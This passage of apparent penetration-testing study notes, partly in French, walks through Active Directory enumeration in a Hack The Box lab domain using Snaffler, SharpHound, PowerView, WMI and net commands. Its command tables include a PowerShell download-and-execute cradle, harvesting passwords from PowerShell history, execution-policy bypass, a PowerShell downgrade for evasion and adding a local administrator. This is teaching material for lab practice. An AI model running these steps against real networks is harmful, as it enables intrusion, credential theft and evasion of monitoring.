2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.keychain$|295B|3/31/2022 12:08:42 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\SetStep.keychain) .keychain
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.tblk$|279B|3/31/2022 12:05:25 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FindConnect.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.psafe3$|301B|3/31/2022 12:09:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\GetUpdate.psafe3) .psafe3
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.keypair$|278B|3/31/2022 12:09:09 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\UnprotectConvertTo.keypair) .keypair
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.tblk$|280B|3/31/2022 12:05:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\ExportJoin.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.mdf$|305B|3/31/2022 12:09:27 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FormatShow.mdf) .mdf
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.mdf$|299B|3/31/2022 12:09:14 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\LockConfirm.mdf) .mdf

<SNIP>
```

Cette commande SharpHound collecte toutes les données disponibles dans un environnement Active Directory (AD) et les enregistre dans un fichier ZIP nommé ILFREIGHT.zip. Utile pour effectuer une analyse complète de l’AD, ce qui peut aider à identifier les relations et les permissions au sein du domaine.
```
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT

2022-04-18T13:58:22.1163680-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-04-18T13:58:22.1163680-07:00|INFORMATION|Initializing SharpHound at 1:58 PM on 4/18/2022
2022-04-18T13:58:22.6788709-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-04-18T13:58:23.0851206-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-04-18T13:58:53.9132950-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 67 MB RAM
2022-04-18T13:59:15.7882419-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-04-18T13:59:16.1788930-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-04-18T13:59:23.9288698-07:00|INFORMATION|Status: 3793 objects finished (+3793 63.21667)/s -- Using 112 MB RAM
2022-04-18T13:59:45.4132561-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2022-04-18T13:59:45.4601086-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2022-04-18T13:59:45.8663528-07:00|INFORMATION|Status: 3809 objects finished (+16 46.45122)/s -- Using 110 MB RAM
2022-04-18T13:59:45.8663528-07:00|INFORMATION|Enumeration finished in 00:01:22.7919186
2022-04-18T13:59:46.3663660-07:00|INFORMATION|SharpHound Enumeration Completed at 1:59 PM on 4/18/2022! Happy Graphing
```

## Credentialed Enumeration - from Windows

### Load ActiveDirectory Module

```
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...  
```


### Get Domain Info

```
PS C:\htb> Get-ADDomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {LOGISTICS.INLANEFREIGHT.LOCAL}
ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL
DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL
DNSRoot                            : INLANEFREIGHT.LOCAL
DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-3842939050-3880317879-2865463114
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL
Forest                             : INLANEFREIGHT.LOCAL
InfrastructureMaster               : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {cn={DDBB8574-E94E-4525-8C9D-ABABE31223D0},cn=policies,cn=system,DC=INLANEFREIGHT,
                                     DC=LOCAL, CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=INLAN
                                     EFREIGHT,DC=LOCAL}
LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL
ManagedBy                          :
Name                               : INLANEFREIGHT
NetBIOSName                        : INLANEFREIGHT
ObjectClass                        : domainDNS
ObjectGUID                         : 71e4ecd1-a9f6-4f55-8a0b-e8c398fb547a
ParentDomain                       :
PDCEmulator                        : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL}
RIDMaster                          : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
SubordinateReferences              : {DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL}
SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL
UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

### Get-ADUser

```
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Sharepoint
Name                 : adfs
ObjectClass          : user
ObjectGUID           : 49b53bea-4bc4-4a68-b694-b806d9809e95
SamAccountName       : adfs
ServicePrincipalName : {adfsconnect/azure01.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5244
Surname              : Admin
UserPrincipalName    :

DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Jessica
Name                 : BACKUPAGENT
ObjectClass          : user
ObjectGUID           : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName       : backupagent
ServicePrincipalName : {backupjob/veam001.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5220
Surname              : Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9
UserPrincipalName    :

<SNIP>
```

###  Checking For Trust Relationships

```
PS C:\htb> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

### Group Enumeration

```
Get-ADGroup -Filter * | select name

name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins

<SNIP>
```

### Group Membership

```
PS C:\htb> Get-ADGroup -Identity "Backup Operators"

DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
ObjectClass       : group
ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
SamAccountName    : Backup Operators
SID               : S-1-5-32-551
```

### Trust Enumeration

```
PS C:\htb> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM 
```
### Testing for Local Admin Access

```
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True 
```

### Finding Users With SPN Set

```
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

serviceprincipalname                          samaccountname
--------------------                          --------------
adfsconnect/azure01.inlanefreight.local       adfs
backupjob/veam001.inlanefreight.local         backupagent
d0wngrade/kerberoast.inlanefreight.local      d0wngrade
kadmin/changepw                               krbtgt
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
sts/inlanefreight.local                       solarwindsmonitor
testspn/kerberoast.inlanefreight.local        testspn
testspn2/kerberoast.inlanefreight.local       testspn2

```

## Living Off the Land

### Commandes de Base pour l'Énumération

| Commande | Résultat |
|----------|----------|
| `hostname` | Affiche le nom du PC |
| `[System.Environment]::OSVersion.Version` | Affiche la version et le niveau de révision du système d'exploitation |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Affiche les correctifs et les mises à jour appliqués à l'hôte |
| `ipconfig /all` | Affiche l'état et les configurations des adaptateurs réseau |
| `set` | Affiche une liste des variables d'environnement pour la session en cours (exécuté depuis l'invite de commande) |
| `echo %USERDOMAIN%` | Affiche le nom de domaine auquel appartient l'hôte (exécuté depuis l'invite de commande) |
| `echo %logonserver%` | Affiche le nom du contrôleur de domaine avec lequel l'hôte se connecte (exécuté depuis l'invite de commande) |


### Exploiter PowerShell

PowerShell existe depuis 2006 et offre aux administrateurs système Windows un cadre étendu pour administrer tous les aspects des systèmes Windows et des environnements AD. C'est un langage de script puissant qui peut être utilisé pour explorer en profondeur les systèmes. PowerShell dispose de nombreuses fonctions et modules intégrés que nous pouvons utiliser lors d'une mission pour explorer l'hôte et le réseau, ainsi que pour envoyer et recevoir des fichiers.

Voici quelques-unes des façons dont PowerShell peut nous aider.

| Cmd-Let | Description |
|---------|-------------|
| `Get-Module` | Liste les modules disponibles chargés pour utilisation. |
| `Get-ExecutionPolicy -List` | Affiche les paramètres de la politique d'exécution pour chaque portée sur un hôte. |
| `Set-ExecutionPolicy Bypass -Scope Process` | Cela changera la politique pour notre processus actuel en utilisant le paramètre -Scope. Cela rétablira la politique une fois que nous quitterons le processus ou le terminerons. C'est idéal car nous ne ferons pas de changement permanent sur l'hôte victime. |
| `Get-ChildItem Env: I ft Key,Value` | Retourne les valeurs d'environnement telles que les chemins clés, les utilisateurs, les informations sur l'ordinateur, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Avec cette commande, nous pouvons obtenir l'historique PowerShell de l'utilisateur spécifié. Cela peut être très utile car l'historique des commandes peut contenir des mots de passe ou nous orienter vers des fichiers de configuration ou des scripts contenant des mots de passe. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL pour télécharger le fichier'); <commandes suivantes>"` | C'est un moyen rapide et facile de télécharger un fichier depuis le web en utilisant PowerShell et de l'appeler depuis la mémoire. |

### Downgrade Powershell

```
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> get-module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...
```

### Firewall Checks

```
PS C:\htb> netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Private Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Public Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096
```

### Windows Defender Check (from CMD.exe) 

```
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

### Get-MpComputerStatus

```
PS C:\htb> Get-MpComputerStatus

AMEngineVersion                  : 1.1.19000.8
AMProductVersion                 : 4.18.2202.4
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2202.4
AntispywareEnabled               : True
AntispywareSignatureAge          : 0
AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
AntispywareSignatureVersion      : 1.361.414.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 0
AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
AntivirusSignatureVersion        : 1.361.414.0
BehaviorMonitorEnabled           : True
ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
ComputerState                    : 0
DefenderSignaturesOutOfDate      : False
DeviceControlDefaultEnforcement  : Unknown
DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
DeviceControlState               : Disabled
FullScanAge                      : 4294967295
FullScanEndTime                  :
FullScanOverdue                  : False
FullScanRequired                 : False
FullScanSignatureVersion         :
FullScanStartTime                :
IoavProtectionEnabled            : True
IsTamperProtected                : True
IsVirtualMachine                 : False
LastFullScanSource               : 0
LastQuickScanSource              : 2

<SNIP>
```

### Informations Réseau

#### Commandes Réseau

| Commande | Description |
|----------|-------------|
| `arp -a` | Liste tous les hôtes connus stockés dans la table arp. |
| `ipconfig /all` | Affiche les paramètres des adaptateurs pour l'hôte. Nous pouvons déterminer le segment de réseau à partir de là. |
| `route print` | Affiche la table de routage (IPv4 & IPv6) identifiant les réseaux connus et les routes de couche trois partagées avec l'hôte. |
| `netsh advfirewall show allprofiles` | Affiche l'état du pare-feu de l'hôte. Nous pouvons déterminer s'il est actif et s'il filtre le trafic. |

Des commandes telles que `ipconfig /all` et `systeminfo` nous montrent quelques configurations réseau de base. Deux autres commandes importantes nous fournissent une tonne de données précieuses et pourraient nous aider à approfondir notre accès. `arp -a` et `route print` nous montreront quels hôtes la machine sur laquelle nous sommes est au courant et quels réseaux sont connus de l'hôte. Tous les réseaux qui apparaissent dans la table de routage sont des avenues potentielles pour un mouvement latéral car ils sont suffisamment accessibles pour qu'une route ait été ajoutée, ou ils ont été administrativement définis là pour que l'hôte sache comment accéder aux ressources sur le domaine. Ces deux commandes peuvent être particulièrement utiles dans la phase de découverte d'une évaluation en boîte noire où nous devons limiter notre balayage.


```powershell
PS C:\htb> route print

===========================================================================
Interface List
  8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2
 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25    261
          0.0.0.0          0.0.0.0       10.129.0.1   10.129.201.234     20
       10.129.0.0      255.255.0.0         On-link    10.129.201.234    266
   10.129.201.234  255.255.255.255         On-link    10.129.201.234    266
   10.129.255.255  255.255.255.255         On-link    10.129.201.234    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
       172.16.4.0    255.255.254.0         On-link       172.16.5.25    261
      172.16.5.25  255.255.255.255         On-link       172.16.5.25    261
     172.16.5.255  255.255.255.255         On-link       172.16.5.25    261
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    10.129.201.234    266
        224.0.0.0        240.0.0.0         On-link       172.16.5.25    261
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    10.129.201.234    266
  255.255.255.255  255.255.255.255         On-link       172.16.5.25    261
  ===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       172.16.5.1  Default
===========================================================================

IPv6 Route Table
===========================================================================
```

L’utilisation des commandes arp -a et route print ne bénéficiera pas seulement à l’énumération des environnements AD, mais nous aidera également à identifier les opportunités de pivot vers différents segments de réseau dans n’importe quel environnement. Ce sont des commandes que nous devrions envisager d’utiliser à chaque engagement pour aider nos clients à comprendre où un attaquant pourrait tenter d’aller après une compromission initiale.


### Windows Management Instrumentation (WMI)

Windows Management Instrumentation (WMI) est un moteur de script largement utilisé dans les environnements d'entreprise Windows pour récupérer des informations et exécuter des tâches administratives sur des hôtes locaux et distants. Pour notre utilisation, nous allons créer un rapport WMI sur les utilisateurs de domaine, les groupes, les processus et d'autres informations de notre hôte et d'autres hôtes de domaine.

#### Vérifications rapides WMI

| Commande | Description |
|----------|-------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Affiche le niveau de correctif et la description des correctifs appliqués |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Affiche les informations de base de l'hôte, y compris les attributs de la liste |
| `wmic process list /format:list` | Liste de tous les processus sur l'hôte |
| `wmic ntdomain list /format:list` | Affiche des informations sur le domaine et les contrôleurs de domaine |
| `wmic useraccount list /format:list` | Affiche des informations sur tous les comptes locaux et tous les comptes de domaine qui se sont connectés à l'appareil |
| `wmic group list /format:list` | Informations sur tous les groupes locaux |
| `wmic sysaccount list /format:list` | Affiche des informations sur tous les comptes système utilisés comme comptes de service |


```powershell
C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
```

### Commandes Net

Les commandes Net peuvent être bénéfiques lorsque nous tentons d'énumérer des informations à partir du domaine. Ces commandes peuvent être utilisées pour interroger l'hôte local et les hôtes distants, de la même manière que les capacités fournies par WMI. Nous pouvons lister des informations telles que :

- Utilisateurs locaux et de domaine
- Groupes
- Hôtes
- Utilisateurs spécifiques dans les groupes
- Contrôleurs de domaine
- Exigences de mot de passe

Nous couvrirons quelques exemples ci-dessous. Gardez à l'esprit que les commandes net.exe sont généralement surveillées par les solutions EDR et peuvent rapidement révéler notre emplacement si notre évaluation comporte une composante d'évasion. Certaines organisations configureront même leurs outils de surveillance pour déclencher des alertes si certaines commandes sont exécutées par des utilisateurs dans des UO spécifiques, comme le compte d'un associé marketing exécutant des commandes telles que whoami et net localgroup administrators, etc. Cela pourrait être un signal d'alarme évident pour quiconque surveille fortement le réseau.

#### Tableau des Commandes Net Utiles

| Commande | Description |
|----------|-------------|
| `net accounts` | Informations sur les exigences de mot de passe |
| `net accounts /domain` | Politique de mot de passe et de verrouillage |
| `net group /domain` | Informations sur les groupes de domaine |
| `net group "Domain Admins" /domain` | Liste des utilisateurs avec des privilèges d'administrateur de domaine |
| `net group "domain computers" /domain` | Liste des PC connectés au domaine |
| `net group "Domain Controllers" /domain` | Liste des comptes PC des contrôleurs de domaine |
| `net group <domain_group_name> /domain` | Utilisateur appartenant au groupe |
| `net groups /domain` | Liste des groupes de domaine |
| `net localgroup` | Tous les groupes disponibles |
| `net localgroup administrators /domain` | Liste des utilisateurs appartenant au groupe des administrateurs dans le domaine (le groupe Domain Admins est inclus ici par défaut) |
| `net localgroup Administrators` | Informations sur un groupe (administrateurs) |
| `net localgroup administrators [username] /add` | Ajouter un utilisateur aux administrateurs |
| `net share` | Vérifier les partages actuels |
| `net user <ACCOUNT_NAME> /domain` | Obtenir des informations sur un utilisateur dans le domaine |
| `net user /domain` | Lister tous les utilisateurs du domaine |
| `net user %username%` | Informations sur l'utilisateur actuel |
| `net use x: \\computer\share` | Monter le partage localement |
| `net view` | Obtenir une liste des ordinateurs |
| `net view /all /domain[:domainname]` | Partages sur les domaines |
| `net view \\computer /ALL` | Lister les partages d'un ordinateur |
| `net view /domain` | Liste des PC du domaine |

#### Liste des Groupes de Domaine

```powershell
PS C:\htb> net group /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

Group Accounts for \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-------------------------------------------------------------------------------
*$H25000-1RTRKC5S507F
*Accounting
*Barracuda_all_access
*Barracuda_facebook_access
*Barracuda_parked_sites
*Barracuda_youtube_exempt
*Billing
*Billing_users
*Calendar Access
*CEO
*CFO
*Cloneable Domain Controllers
*Collaboration_users
*Communications_users
*Compliance Management
*Computer Group Management
*Contractors
*CTO

<SNIP>
```
